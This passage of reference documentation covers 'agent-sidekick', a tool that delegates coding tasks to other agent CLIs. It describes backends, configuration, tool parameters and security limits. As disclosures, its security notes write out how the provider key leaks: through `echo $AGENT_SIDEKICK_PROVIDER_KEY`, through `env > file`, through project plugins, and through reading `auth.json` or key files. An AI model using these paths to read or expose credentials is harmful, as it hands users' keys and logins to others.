- **Permissions:** OpenCode's run mode answers every "ask" with an automatic reject and then ends the run without an answer, so nothing is left at "ask": read (except `*.env`, `*.env.*`; `*.env.example` is allowed; this rule covers only OpenCode's `read` tool, the bash tool can still `cat .env`, so it is no protection for secrets in the project), edit, bash, glob, grep, list and webfetch are allowed; websearch, task (subagents), external_directory (files outside `cwd`), doom_loop and question are denied. The same set is also passed as `OPENCODE_PERMISSION`, which OpenCode applies after every other config layer.
- **`max_turns`** becomes the build agent's `steps` (passed per run in `OPENCODE_CONFIG_CONTENT`). It is a **soft** cap: OpenCode tells the model to stop using tools, but keeps offering them; a model that ignores this runs until `timeout_s`, which is the real hard limit (the process tree is killed).
- **`allowed_tools`** is ignored (the log notes it); use `read_only`.
- **Result:** the JSON event stream is translated into the final answer (the text after the last step), `[error] <name>: <message>` lines for errors, `stopped: permission auto-rejected` when that happened, other output lines, and a usage line (`[usage] steps N, tokens in X / out Y, cost Z`). A run that exits 0 without any answer counts as failed (`failed: no answer: ...`), so a fallback can take over. The full event stream is in the run log.
- **Before each run** the provider probe of [Reachability](#reachability) runs, so a dead endpoint or a rejected key fails fast (OpenCode itself would retry connection errors for about a minute) and a fallback can take over.

Known limits (OpenCode 1.19.3, verified with a local stub server):

- **Project plugins run, and they get the provider key.** `.opencode/plugin/*.js|ts` and `.opencode/plugins/...` in `cwd` or a parent directory up to the repository root are executed by OpenCode even with `OPENCODE_DISABLE_PROJECT_CONFIG=1` (also with `OPENCODE_PURE=1` or `OPENCODE_DISABLE_DEFAULT_PLUGINS=1`). So are plugins named in a project config document (`plugin`/`plugins` in `opencode.json`/`opencode.jsonc` or `.opencode/opencode.json(c)` in those directories): a `file://` URL was verified to run; an npm package name is presumably installed and run as well (not tested). The plugin code runs inside OpenCode's process with `AGENT_SIDEKICK_PROVIDER_KEY` in its environment (verified), so a project can read and exfiltrate the key, not only run code. The rest of the project's `opencode.json` (model, permissions) is not applied. agent-sidekick detects plugin directories and config documents that name plugins and writes a warning into the run log and the server log; it does not block the run. Treat it like project hooks of Claude Code: only run opencode backends in projects whose code you trust, and use a key you can revoke.
- **First run needs the network:** in a new backend directory OpenCode installs its plugin SDK through npm (into the isolated npm cache and config directory) and downloads ripgrep from GitHub (into the isolated cache).
- **Windows:** OpenCode's bash tool needs Git Bash. agent-sidekick sets `OPENCODE_GIT_BASH_PATH` from an inherited `OPENCODE_GIT_BASH_PATH` or `CLAUDE_CODE_GIT_BASH_PATH`, or from a `git.exe` in `PATH` (`<git>\..\bin\bash.exe`); without one, OpenCode falls back to `cmd.exe` (noted in the run log).
- **The agent's own tools can read the key.** OpenCode resolves `{env:AGENT_SIDEKICK_PROVIDER_KEY}` from its own process environment, so the key has to be there, and the bash tool inherits it: `echo $AGENT_SIDEKICK_PROVIDER_KEY` sends it to the model, `env > file` writes it into the project (both verified). agent-sidekick redacts it from its run log and results only.
- **`max_concurrent` > 1** on one opencode backend is not verified: concurrent runs share the generated `opencode.json` (safe, it is written only when changed, via rename) but also OpenCode's `data`/`state` directories and its session database. The examples use 1; use separate backends for parallel runs.
- **WSL:** with Windows `PATH` interop, the Linux lookup can pick up the Windows npm shim `opencode` (a shell script that runs the Windows `opencode.exe`). `HOME`/`XDG_*` isolation does not cross into a Windows process (no `WSLENV`), so that run would use the Windows user's real OpenCode configuration and home. In WSL install OpenCode natively and point `harness_path` at it.
- The provider must support tool calling for the model (OpenCode always sends tools). A vLLM-based gateway without auto tool choice answers 400, which shows up as `[error] APIError: ...`.

### Codex backends

The OpenAI Codex CLI (`npm install -g @openai/codex`; `agent-sidekick harness install codex` prints the official commands) runs with your ChatGPT plan or an OpenAI API key:

```toml
[backends.codex]
harness = "codex"
auth = "chatgpt"          # the default; or "api-key"
description = "OpenAI Codex agent (GPT models). Strong for code changes, debugging and reviews; edits files and runs commands in cwd inside Codex's sandbox."
max_concurrent = 1
# default = true          # exactly one backend in config.toml needs it; set it here if codex is your only backend
# models = ["gpt-6.1-sol", "gpt-6-luna"]   # optional allowlist; without it any model, and Codex's default when none is requested
```

```sh
agent-sidekick setup --backend codex   # chatgpt: creates the backend's CODEX_HOME and prints the `codex login` command; api-key: asks for the key
agent-sidekick backends test codex     # codex found, logged in (or key stored and accepted)
```

Keys:

| Key | Meaning |
|-----|---------|
| `harness` | `"codex"` (required; there is no `type` for it). |
| `auth` | `"chatgpt"` (default): your ChatGPT plan (Plus, Pro, Business, Edu, Enterprise); you log in once with `codex login` in the backend's own `CODEX_HOME` (the exact command, for PowerShell, Git Bash or sh, is printed by `setup --backend <name>`; without a browser use `codex login --device-auth`). Codex keeps and refreshes the login in `<config-dir>/codex/<name>/auth.json`. `"api-key"`: an OpenAI API key (keyring user `backend-<name>`, or `api_key_env`), billed per token. |
| `base_url` | Only with `api-key`: a Responses-compatible provider instead of OpenAI (`http(s)://.../v1`; Codex calls `{base_url}/responses`). An endpoint that only offers `/chat/completions` cannot be used with Codex 0.163 (use an opencode backend for it). Same URL rules as for claude-endpoint. |
| `wire_api` | Only with `api-key` and `base_url`; only `"responses"` is accepted (the default; anything else is a config error). |
| `api_key_env` | Only with `api-key`: read the key from this variable of the MCP server's environment instead of the stored one. |
| `models` / `model` | Optional. `models` is the allowlist, `model` the default. Without either, any requested model is passed and a run without `model` uses Codex's default model. With `auth = "chatgpt"` that default can be rejected for the account ("model is not supported when using Codex with a ChatGPT account", seen with gpt-6.1-sol and gpt-6-astra on 2026-10-22); `codex debug models` with the backend's `CODEX_HOME` lists the models the account may use. |
| `read_only` | `true`: `--sandbox read-only` (Codex may read, not write; shell commands that write are blocked). Default `false`: `--sandbox workspace-write` (writes in `cwd`, shell commands without network). |
| `windows_sandbox` | Windows only: Codex's sandbox implementation, passed as `-c windows.sandbox=<value>`: `mxc` (default; Windows 11 24H2/25H2 with the MXC capability), `elevated` (needs a one-time admin setup), `unelevated` (weaker). Without a working sandbox, workspace-write shell commands are rejected ("blocked by policy"). |
| `harness_path` | Absolute path (or `~/...`) of the codex executable. Default: the npm package's native `codex.exe` (next to a `codex.cmd` in `PATH` or in `%APPDATA%\npm`, x64 or arm64 package), then `%LOCALAPPDATA%\Programs\OpenAI\Codex\bin\codex.exe` (standalone installer), then `codex.exe` in `PATH`; on Unix `codex` in `PATH`. The `.cmd` shim is never used; a `.cmd`/`.bat` here restricts model names and `cwd` to plain characters. |
| `cost` | Default `quota` (chatgpt) or `paid` (api-key). |

`description`, `default`, `max_concurrent`, `env` and `pass_env` work as for every backend (`env` must not set `CODEX_HOME`, `CODEX_SQLITE_HOME`, `CODEX_API_KEY`, `CODEX_ACCESS_TOKEN`); `config_dir`, `provider`, `request_timeout_s`, `model_options`, `command`, `prompt_via_stdin` and `secret_env` are not allowed.

How a run works:

- argv: `codex exec --json --ephemeral --skip-git-repo-check --color never --sandbox <read-only|workspace-write> --cd <cwd> [-m <model>] [-c windows.sandbox=<impl>] -`; the prompt goes to stdin.
- **Isolation:** `CODEX_HOME` and `CODEX_SQLITE_HOME` are the backend's own directory `<config-dir>/codex/<name>/`, so your own `~/.codex` (its ChatGPT login, config, MCP servers and sessions) is never read or written, and Codex's state (SQLite databases, logs, skills, sandbox logs) stays in that directory. `HOME`/`USERPROFILE` are not changed: the agent's shell commands need your real profile (git config, toolchains). Codex reads `AGENTS.md` in the project like Claude Code reads `CLAUDE.md`; a project's `.codex/config.toml` is ignored (Codex loads it only for trusted projects, and the generated config trusts none).
- **Generated config:** `<config-dir>/codex/<name>/config.toml` is rewritten before each run when it changed. It contains no secret: `cli_auth_credentials_store = "file"` (so `codex login` stores the login in that directory, never in the OS keyring), no update check, no history file, no analytics, the shell filters below, and for `base_url` a custom provider `sidekick` (`wire_api = "responses"`, `env_key = "AGENT_SIDEKICK_PROVIDER_KEY"`). It never contains `projects` or `mcp_servers`.
- **The agent's shell commands never see a key:** by default Codex passes the whole environment to the commands the model runs, including `CODEX_API_KEY`, `OPENAI_API_KEY` and a provider key (verified with codex 0.163.0). The generated config switches on Codex's own exclusion of variables whose names contain `KEY`, `SECRET` or `TOKEN` and excludes `AGENT_SIDEKICK_*`, `CODEX_API_KEY`, `CODEX_ACCESS_TOKEN`, `OPENAI_API_KEY`, `ANTHROPIC_*` and `CLAUDE*` (verified: only Codex's own `CODEX_*` runtime variables remain). This also removes other `*_TOKEN`/`*_KEY` variables (e.g. `GH_TOKEN`) from the agent's commands.
- **The key** is only in the child's environment: `CODEX_API_KEY` for OpenAI, `AGENT_SIDEKICK_PROVIDER_KEY` for a `base_url` provider (which ignores `CODEX_API_KEY`). It is never written into a file or an argument (`codex login --with-api-key` is never used) and is redacted from logs and results.
- **`max_turns`** is ignored (Codex has no turn limit); `timeout_s` is the hard limit. **`allowed_tools`** is ignored; use `read_only`. Both are noted in the run log.
- **Result:** the JSON event stream is translated into a compact activity summary (commands with exit code, MCP tool calls, changed files; the last 12), warnings (Codex reports transient reconnects and fallbacks as `error` events in runs that succeed, so they never fail a run), Codex's stderr lines, the final answer (the last `agent_message`), `[error] turn failed: ...` and a usage line (`[usage] tokens in X (cached Y) / out Z (reasoning R)`). A run that exits 0 without an answer counts as failed. The full event stream is in the run log.
- **Before each run** a ChatGPT backend needs its login file (otherwise the run is not started and a fallback can take over); an api-key backend runs the provider probe of [Reachability](#reachability).

Known limits (Codex CLI 0.163.0):

- **Parallel runs of one ChatGPT login** may race when Codex refreshes the login; keep `max_concurrent = 1` (the wizard's template does).
- **What Codex keeps in the backend directory:** observed with 0.163.0 even with `--ephemeral`: SQLite databases (`goals_1`, `logs_2`, `memories_1`, `queue_1`, `state_5.sqlite`, each with `-shm`/`-wal`), `installation_id` and `skills/`, besides `config.toml` and (ChatGPT) `auth.json`. Outside the temp directory Codex 0.163 also creates "PATH alias" helper binaries for its home (under the temp directory it refuses, with a warning that agent-sidekick filters from the result); their exact names and location were not verified (all tests used a temp directory). `uninstall --purge` removes the backend directory.
- **Codex's own MCP servers, plugins and skills** of your `~/.codex` are not available to the delegated agent (its home is the backend's directory).
- **Unix:** the npm package's vendor layout was not verified; point `harness_path` at the native binary if `codex` in `PATH` is a Node.js shim.

### CLAUDE.md routing example

Put rules like these into the `CLAUDE.md` of your projects (or `~/.claude/CLAUDE.md`), adapted to your backend names. The full version is [`examples/CLAUDE.md`](../examples/CLAUDE.md).

```markdown
## Delegation with agent-sidekick

- Before delegating, call `sidekick_backends`; only use backends that are reachable.
- `local` (free): boilerplate, test scaffolding, docs, mechanical refactors.
- `claude` (second Claude account, quota): complex multi-file changes and debugging.
- `aider` (free, edits without asking): small edits to files you name; review the diff.
- Pick the model from the backend's `models` in `sidekick_backends` (or omit `model` for
  its `default_model`); a model the backend does not list is rejected.
- Always pass `cwd` (absolute project path) and a self-contained prompt.
- Use `fallback: "local"` only for tasks that are safe to retry; the failed primary may
  have changed files. Check `git status` after a fallback.
- Never put secrets into prompts; prompts are written to the run log.
- Verify delegated changes (diff, tests) before building on them.
```

## Tool reference

### `sidekick_run`

| Parameter       | Default              | Notes |
|-----------------|----------------------|-------|
| `prompt`        | (required)           | Task for the delegated agent. |
| `cwd`           | server's cwd         | Working directory. Always pass it; the server's cwd is wherever Claude Code started it. |
| `backend`       | the default backend  | Name of a configured backend. |
| `fallback`      | none                 | Backend used if the primary fails, see [Fallback](#fallback). |
| `max_turns`     | 30                   | Maximum 200. Passed as `--max-turns` (claude-*) or `{max_turns}` (command). |
| `timeout_s`     | 1800                 | Maximum 7200. The whole process tree is killed on timeout. Applies per attempt: a fallback gets its own full `timeout_s`. |
| `model`         | backend's default model / CLI default | One of the backend's `models` (see `sidekick_backends`); validated against that allowlist before anything runs. Passed as `--model` (claude-*) or `{model}` (command), see [Models](#models). |
| `allowed_tools` | none                 | List passed as `--allowedTools` (claude-* only). |

The result starts with the backend that actually ran and its model, `backend: <name> (<type>), model <model>` (without `, model ...` when no model was requested and the backend has no default, or the command backend takes no model). After a fallback that line also names the failed primary backend and the reason; if the primary ran, a separate line `primary: exit_code N, log <path> — it ran and may have left changes in cwd` follows.
Then follow `exit_code:`, `log:` (the path of the full run log), `duration_s:` and the last 4000 characters of output.

- **Cancellation:** cancelling the tool call in Claude Code (Esc) kills the delegated run's whole process tree; a cancelled run that is still queued never starts.
- **Long runs:** the server sends a progress notification every 30 s while a run is active. This keeps the call alive with respect to Claude Code's MCP tool idle timeout (`CLAUDE_CODE_MCP_TOOL_IDLE_TIMEOUT`, 30 minutes for stdio servers by default). If you have lowered the overall `MCP_TOOL_TIMEOUT` (default about 28 hours), keep it above the longest call: with `fallback` that is up to about 2 x `timeout_s` plus queue time, because the fallback gets its own `timeout_s`. While the fallback waits for a slot, progress reports it as queued.

### `sidekick_backends`

No parameters. Returns a JSON object:

```json
{
  "config_error": null,
  "backends": [
    { "name": "kiconnect", "type": "command", "description": "...", "cost": "free", "default": false,
      "models": ["openai-gpt-oss-120b", "qwen-qwen3-8-27b"], "default_model": "openai-gpt-oss-120b",
      "reachable": true, "detail": "...", "max_concurrent": null, "running": 0, "queued": 0 }
  ]
}
```

- `config_error`: `null`, or the problem with `config.toml`. Then `backends` is empty and `sidekick_run` fails until the file is fixed.
- Per backend: `name`, `type`, `description`, `cost`, `default`, `models` (the allowlist for `sidekick_run`'s `model`; `null`: a claude-* backend accepts any model, a command backend without `{model}` takes none), `default_model` (used when `model` is omitted; `null`: the account's/endpoint's default, or no model), `reachable`, `detail` (why it is or is not reachable), `max_concurrent` (`null` without a per-backend limit), `running` and `queued`.
- Pick the backend by `description` and `cost`, and the model from its `models`.

It never contains secrets or environment values.

### `sidekick_status`

Shows running and queued runs, per backend and in total, with the global and per-backend limits.
Without a `[backends]` section it also shows the global `default model` and the agent's Claude config dir. With `[backends]`, the line of each `claude-oauth` and `claude-endpoint` backend shows that backend's effective `model` and `config_dir` instead (the top-level `default_model` is not used then). A backend with `models` also shows its allowlist (`models [a, b]`); a command backend with `{model}` shows its default model and allowlist.

### Trust tools

Experience data lives in the separate private repository `data_repo` (default `AAPPHH/sidekick-data`; layout at the repo root: `models.parquet`, `protected.parquet`, `peers.toml`, `experiences/<name>/`, `aggregate/latest.parquet`). The sidekick keeps a full clone in `<config-dir>/data/checkout` (override: `AGENT_SIDEKICK_DATA_DIR`), never in a project worktree, and full local copies of its own session files in `<data>/local`. `secret` (HMAC key, never pushed), `machine_id` and a `pending` flag sit next to them.

- `sidekick_steckbrief(model_id | backend[+model], scope?)`: rendered profile (registry, trust per dimension and scope, counters, last block, review share, write and decisions right, cost balance, newest conclusions).
- `sidekick_dispatch(prompt, dimension, scope?, backend?, model?, cwd?, job_id?, max_turns?, timeout_s?, checkpoint?, quant?)`: job in its own git worktree, same queues and progress as `sidekick_run`. No write right: no write tools, any diff is a block. Diff checks: protected paths and terms, module path bound, file and line limits. Result as branch `sidekick/<job_id>` plus patch; applied only for the Gold model (provider `anthropic`, model `claude-opus-5-5`, harness `claude-code` and a `claude-oauth` backend; the provider is always derived from the backend, never from the caller; on a conflict branch and patch are kept). Blocked and aborted outcomes are recorded automatically.
- `sidekick_record_experience(model_id | backend[+model], dimension, outcome, scope?, review_s?, conclusion?, visibility?, ...)`: outcome `accepted|rejected|aborted|note|seed`. `seed` only for search and inventory with `seed_value`. `visibility` defaults to `private`.
- `sidekick_query(sql)`: read-only SQL over `models`, `protected`, `experiences`.
- `sidekick_sync()`: pull, then push pending commits.

Sync: pull at server start (when `data_name` is set or a checkout exists; failure keeps the local state). Each recorded event rewrites the own session file, `git add`s only that path, commits as `data: ...` and pushes; a rejection triggers `pull --rebase` and a bounded retry, offline leaves the pending flag for the next `sidekick_sync`. Nothing outside `experiences/<data_name>/` is ever committed. In the pushed copy `user_id` and `machine_id` are the first 16 hex of HMAC-SHA256(local secret, raw value); `summary` and `conclusion` are pushed only for `visibility = shared`.

### Data repository protection

The data lives in the private repository `AAPPHH/sidekick-data` (config key `data_repo`). Its validation and aggregation workflows, the owner-only files and the branch and tag rulesets are described in the README of that repository.

Open point: the `data-validated` tag in `AAPPHH/sidekick-data` is currently unprotected. GitHub rejects the Actions bot as a ruleset bypass actor on user-owned repositories, and push rules for `.github/**` need an organisation-owned repository. Intended solution: a write deploy key stored as a secret, which the workflows use to push the tag, plus a tag ruleset for `data-validated` (update, deletion and creation restricted; bypass: repository admin and deploy keys).

## CLI reference

| Command | Purpose |
|---------|---------|
| `agent-sidekick setup` (interactive terminal, no flags) | Guided setup (wizard, German): prerequisites, profiles (KI:connect.nrw, second Claude account, Gemini, OpenAI Codex with ChatGPT plan or API key), optional `npm install -g` of OpenCode/Gemini CLI/Codex, default backend, `config.toml` from templates (merge, backup + rewrite, or cancel for an existing file), keys or the `codex login` command, registration with Claude Code (and, if Codex is installed, on request with Codex) and `doctor`. Without Claude Code but with the Codex CLI it hides the second-Claude-account profile, skips the Claude Code registration and registers with Codex without asking; without either it aborts before writing anything and names both install commands. |
| `agent-sidekick setup [--token-stdin] [--no-register] [--claude PATH] [--no-wizard]` | Non-interactive setup (also a bare `setup` without a terminal): ask for the token of every `claude-oauth` backend that has none yet (backends with a stored token are skipped) and register the MCP server. Endpoint keys and command secrets are not asked here (a hint names the `setup --backend` call). Re-registering keeps the extra `-e` variables of the existing user-scope registration and prints their names (never their values); `CLAUDE_CODE_OAUTH_TOKEN` and `AGENT_SIDEKICK_TOKEN` found there are dropped with a warning. If `claude` is not found (and no `--claude` was given) but the Codex CLI is installed, the server is registered with Codex instead (as `setup --codex` does) and a note says so; without Codex it fails and names the next steps, including `setup --codex`. |
| `agent-sidekick setup --register-only [--claude PATH]` | Only (re-)register the MCP server: no token prompts and no terminal needed, e.g. after storing each token with `setup --backend <name> --token-stdin`. Same Codex fallback as above when `claude` is missing. |
| `agent-sidekick setup --backend <name> [--token-stdin]` | Set up one backend only: `claude-oauth` token, `claude-endpoint` API key (or a note that `api_key_env` is used), the `secret_env` value of a `command` backend (nothing to store without `secret_env`), the provider key of an `opencode` backend (keyring user `backend-<name>`; nothing to store for ollama or with `api_key_env`), the API key of a codex `api-key` backend (`backend-<name>`), or for a codex `chatgpt` backend: create its `CODEX_HOME` with the generated config, print the `codex login` command for it, wait for Enter (in a terminal) and report whether the login file exists. The MCP registration is not changed. |
| `agent-sidekick setup --codex [--claude PATH]` | Only register the MCP server with the Codex CLI (`$CODEX_HOME/config.toml`, default `~/.codex/config.toml`; backup first), see [Codex as MCP host](#codex-as-mcp-host). No prompts, no terminal needed, and Claude Code is not required (without it `AGENT_SIDEKICK_CLAUDE` is not written and only non-claude backends can run). |
| `agent-sidekick backends list [--check]` | Table of name, type, cost, default and description; `--check` adds reachability. |
| `agent-sidekick backends test <name>` | Reachability with details (claude version, resolved program, HTTP status). Exit code 0 if reachable, 1 otherwise. |
| `agent-sidekick harness list` | Each known harness (`claude`, `opencode`, `codex`, `command`): installed or not, path, `--version` output, and the configured backends using it. `command` is generic (its program is configured per backend), so it shows `n/a`. For `codex` the native `codex.exe` from the npm package is preferred over the `.cmd` shim. `opencode --version` and `codex --version` run in a temporary isolated home that is removed afterwards. |
| `agent-sidekick harness install <name>` | Prints the official install command(s) of a harness; agent-sidekick never runs them. `command` has nothing to install. |
| `agent-sidekick doctor [--offline]` | Checks the installation, the harness executables the backends use (`opencode`, `codex`: path and version), every backend and, when the Codex CLI is installed, the [Codex registration](#codex-as-mcp-host) (read-only; not registered is fine, except on a [Codex-only machine](#codex-only-machines)), and prints next steps. A missing `claude` is a failure only if a `claude-*` backend is configured (including the implicit `claude` of a config without `[backends]`) or the Codex CLI is not installed; otherwise it is an `[OK]` note and the Claude Code registration check is skipped. Also shows an update hint at most once a day (checked and shown once, later runs that day stay quiet; result kept in `<config-dir>/update-check.json`, only if that directory exists); `--offline` skips the check. A failed check is an info line, never a doctor failure. |
| `agent-sidekick update` | Checks the latest GitHub release and prints the install command if a newer one exists. Exit code 0 also when up to date or no release exists yet; 1 if the check failed (offline, rate limit, invalid `AGENT_SIDEKICK_UPDATE_URL`). |
| `agent-sidekick uninstall [--purge]` | Removes the stored secrets of all configured backends (tokens, endpoint keys, command secrets, opencode and codex keys, the ChatGPT login files of codex backends, and the v0.1 token), the MCP registration in Claude Code and the one in Codex (after a backup of the Codex config). The opencode and codex backend directories (`<config-dir>/opencode/<name>`, `<config-dir>/codex/<name>`, no keys left) are only removed with `--purge`. |

## Configuration

Optional `config.toml` in the config directory:

```toml
max_concurrent = 16       # parallel runs over all backends (default 16); more are queued
default_max_turns = 30
default_timeout_s = 1800
default_model = "sonnet"  # optional; only for the implicit backend (no [backends] section)
claude_path = "/abs/path/to/claude"  # optional, used by claude-* backends
pass_env = []             # inherited variables to keep for every backend, see above
data_repo = "AAPPHH/sidekick-data"  # owner/name, a full git URL or a local path
data_name = "alice"       # your prefix under experiences/ in the data repo; unset: nothing is pushed
```

The server rereads `config.toml` before every tool call (`sidekick_run`, `sidekick_backends`, `sidekick_status`) when the file has changed, so edits take effect on the next call without an MCP reconnect. A call that is already running keeps the configuration it started with. If the changed file is invalid, the server keeps the last valid configuration, reports the error as `config_error` in `sidekick_backends` and as `config error` in `sidekick_status`, and adds a note to `sidekick_run` errors; the log gets a warning per change and an info line "config reloaded" with the backend names after every successful reload. If the file was already invalid when the server started, `sidekick_run` stays disabled until it is fixed. Rate-limit cooldowns and the running/queued counters survive a reload; a changed `max_concurrent` gets a new limit for new runs.

`[backends.<name>]` keys (names: 1-32 characters `a-z`, `0-9`, `_`, `-`, starting with a letter or digit; keys not valid for the type or harness are a config error):

| Key | Types | Default | Meaning |
|-----|-------|---------|---------|
| `type` | all | (required, or `harness`) | `claude-oauth`, `claude-endpoint` or `command`. |
| `harness` | all | (required, or `type`) | `claude` (claude-oauth without `base_url`, claude-endpoint with it), `opencode`, `codex` or `command`. If both `type` and `harness` are set they must agree; `opencode` and `codex` have no `type`. |
| `description` | all | (required) | What the backend is good for; read by the calling session. |
| `default` | all | `false` | Exactly one backend must have `default = true`. |
| `cost` | all | `quota` (claude-oauth, codex with chatgpt), `paid` (claude-endpoint, opencode, codex with api-key), `free` (command, opencode with ollama) | `free`, `quota` or `paid`; informs the caller. |
| `max_concurrent` | all | no own limit | Per-backend limit (at least 1), in addition to the global one. |
| `env` | all | none | Extra non-secret variables, e.g. `{ CLAUDE_CODE_ATTRIBUTION_HEADER = "0" }`. Not allowed: `ANTHROPIC_API_KEY`, `ANTHROPIC_AUTH_TOKEN`, `ANTHROPIC_BASE_URL`, `CLAUDE_CODE_OAUTH_TOKEN`, `CLAUDE_CONFIG_DIR`, `AGENT_SIDEKICK_*`. |
| `pass_env` | all | none | Inherited variables to keep for this backend, see [session isolation](#child-environment-and-session-isolation). |
| `model` | all | first of `models`, else CLI default | Default model: `--model` (claude-*) or the value of `{model}` (command; only with `{model}` in `command`). Must be one of `models` when both are set. The `model` parameter of `sidekick_run` overrides it. |
| `models` | all | none (claude-*: any model) | Models the backend offers; an allowlist for `sidekick_run`'s `model`, see [Models](#models). Required for a command backend that uses `{model}`, an error for one that does not. opencode needs `models` or `model`. |
| `config_dir` | claude-oauth, claude-endpoint | `claude` and `sidekick`: `AGENT_SIDEKICK_CLAUDE_CONFIG_DIR` or `~/.claude-sidekick`; others: `~/.claude-sidekick-<name>` | `CLAUDE_CONFIG_DIR` of the agent; absolute or starting with `~`. |
| `base_url` | claude-endpoint, opencode, codex (api-key) | (required; opencode: not for openrouter; codex: optional) | `http://` or `https://` URL of the API (Anthropic-compatible, OpenAI-compatible, or for codex Responses-compatible). Must not contain `user:password@` (config error; store the key with `agent-sidekick setup --backend <name>` or set `api_key_env`); ASCII host (`xn--` form for internationalised names) and a valid port. |
| `auth` | claude-endpoint, codex | `x-api-key` (claude-endpoint), `chatgpt` (codex) | claude-endpoint: `x-api-key` (`ANTHROPIC_API_KEY`) or `bearer` (`ANTHROPIC_AUTH_TOKEN`). codex: `chatgpt` or `api-key`, see [Codex backends](#codex-backends). |
| `api_key_env` | claude-endpoint, opencode, codex (api-key) | none (stored key) | Name of an environment variable with the key. It is removed from every other backend's environment. Not for opencode with ollama. |
| `provider` | opencode | (required) | `openai-compatible`, `ollama` or `openrouter`, see [OpenCode backends](#opencode-backends). |
| `harness_path` | opencode, codex | looked up | Absolute path (or `~/...`) of the harness executable. |
| `read_only` | opencode, codex | `false` | opencode: deny the edit, bash and webfetch tools; codex: Codex's read-only sandbox. |
| `request_timeout_s` | opencode | OpenCode's 300 | Header timeout before OpenCode retries a request (1 to 3600). |
| `model_options` | opencode (openai-compatible, ollama) | none | Table merged into every model entry of the generated opencode.json. |
| `wire_api` | codex (api-key with `base_url`) | `responses` | Only `responses` is accepted. |
| `windows_sandbox` | codex | `mxc` | Windows sandbox of Codex: `mxc`, `elevated` or `unelevated`. |
| `command` | command | (required) | Program and arguments with `{prompt}`, `{cwd}`, `{max_turns}`, `{model}` (placeholders only after `command[0]`). |
| `prompt_via_stdin` | command | `false` | Send the prompt on stdin instead of `{prompt}`. |
| `secret_env` | command | none | Variable that receives the backend's stored secret (`setup --backend <name>`), e.g. `OPENAI_API_KEY`. Not allowed: `CLAUDE_CODE_OAUTH_TOKEN`, `AGENT_SIDEKICK_*`, or a key that is also in `env`. Values shorter than 8 characters are not redacted. |

Config directory:

- Linux: `~/.config/agent-sidekick`
- Windows: `%APPDATA%\agent-sidekick`
- macOS: `~/Library/Application Support/agent-sidekick`

Environment variables:

| Variable | Purpose |
|----------|---------|
| `AGENT_SIDEKICK_CLAUDE` | Absolute path to the `claude` executable (checked before `claude_path` and PATH). |
| `AGENT_SIDEKICK_CLAUDE_CONFIG_DIR` | `CLAUDE_CONFIG_DIR` for the `claude` (or `sidekick`) backend (default `~/.claude-sidekick`). |
| `AGENT_SIDEKICK_CONFIG_DIR` | Overrides the config directory. |
| `AGENT_SIDEKICK_TOKEN` | Token of the `claude` (or `sidekick`) backend for CI/testing; takes precedence over the keyring and token file. |
| `AGENT_SIDEKICK_DISABLE_KEYRING` | Set to `1` to never use the OS keyring (file fallback only). |
| `AGENT_SIDEKICK_LOG` | `tracing` filter, e.g. `debug` or `agent_sidekick=trace`. |
| `AGENT_SIDEKICK_UPDATE_URL` | API base for `update`/`doctor` instead of `https://api.github.com` (tests, GitHub Enterprise or a mirror serving `/repos/<owner>/<repo>/releases/latest`). |

## How it works

For each run on a `claude-*` backend the server starts the official CLI:

```
<claude> -p --max-turns N [--model M] [--allowedTools T1 T2 ...] -- <prompt>
```

A `command` backend starts `command[0]` with the remaining elements as arguments, placeholders replaced (see [Command backends](#command-backends)).

The child environment is described in [Child environment and session isolation](#child-environment-and-session-isolation).

For `claude-*` backends the prompt is passed via stdin instead of the command line when it is longer than 8000 characters, or on Windows when `claude` is a `.cmd` shim (avoids command-line length limits and `cmd.exe` quoting issues).

Timeout, cancellation and server shutdown kill the whole process tree (Job Object on Windows, process group on Unix).
On Linux the server also makes itself a child subreaper, so descendants that detach from the process group (e.g. background commands started by the agent) are re-parented to it and swept when a run is killed.
On SIGTERM (sent by Claude Code when it stops the server) running process trees are killed before the server exits.

## Security

- Secrets are stored in the OS keyring (service `agent-sidekick`; users per backend, see [Secrets per backend](#secrets-per-backend)). If no keyring is available they fall back to files in the config directory with mode 0600 (Unix) or a user-only ACL (Windows).
- The server never writes secrets into logs, error messages or tool output itself, and it redacts the exact secrets of the run and anything matching `sk-ant-…` from the agent's output. Secrets shorter than 8 characters (placeholder keys like `ollama`) are not redacted, so they cannot mangle the output.
  The delegated agent can, however, read its own credential from its environment (`CLAUDE_CODE_OAUTH_TOKEN`, `ANTHROPIC_API_KEY` or `ANTHROPIC_AUTH_TOKEN`; for opencode backends `AGENT_SIDEKICK_PROVIDER_KEY`, which cannot be avoided because OpenCode resolves the key reference in its config from its own environment, and which project plugins see as well); an agent instructed to print it in altered form (encoded, reversed, split) could expose it in the log and the tool result. Treat the delegated agent as trusted with that credential. Codex backends are the exception for shell commands: the generated config keeps every key out of the commands the model runs (see [Codex backends](#codex-backends)). Codex's sandbox still allows reading the whole disk, so the model's commands can read files that hold credentials, like any agent running as your user: in ChatGPT mode the login file `<CODEX_HOME>/auth.json`, and without a keyring the key files of the file fallback (e.g. `<config-dir>/backend-<name>.key`); both were read in a real run. agent-sidekick never reads the ChatGPT login, so it cannot redact it from the output.
- `sidekick_backends`, `backends list/test` and `doctor` never print secrets or environment values.
- Network: agent-sidekick itself makes only these requests, never a model call. All model traffic is made by `claude`, `opencode` or the configured command.
  - The reachability probe described in [Reachability](#reachability) (configured `base_url` only, 2 s timeout, no credentials except the provider key as bearer token for an opencode openai-compatible backend's `GET {base_url}/models`, without following redirects).
  - The update check of `doctor` (at most once a day, on by default; `doctor --offline` skips it) and of `update`: `GET https://api.github.com/repos/AAPPHH/agent-sidekick/releases/latest` (or `AGENT_SIDEKICK_UPDATE_URL`), no credentials; GitHub sees your IP address and the agent-sidekick version in the `User-Agent`.
  - In the setup wizard, only after asking: the KI:connect or OpenAI key check (`GET {base_url}/models` or `https://api.openai.com/v1/models` with the key as bearer token, 15 s timeout) and `npm install -g opencode-ai` / `@google/gemini-cli` / `@openai/codex`, which npm downloads from its registry.
- Under Codex as MCP host the server runs outside Codex's sandbox (as every MCP server does), and so does every agent it starts. That is why `sidekick_run` keeps Codex's approval prompt, see [Codex as MCP host](#codex-as-mcp-host).
- Prompts are written to the run log in `<config-dir>/logs`; do not put secrets into prompts.
- Run logs can contain the full prompt and the agent's complete output. On Unix the logs directory is created with mode 0700 and each run log with mode 0600; on Windows they keep the user-profile ACL.
- To rotate or revoke a Claude token: revoke it in the Claude account settings, then run `claude setup-token` again (see the README) and `agent-sidekick setup --backend <name>` (`setup --no-wizard` skips backends that already have a token).
- Never commit tokens or keys to Git.
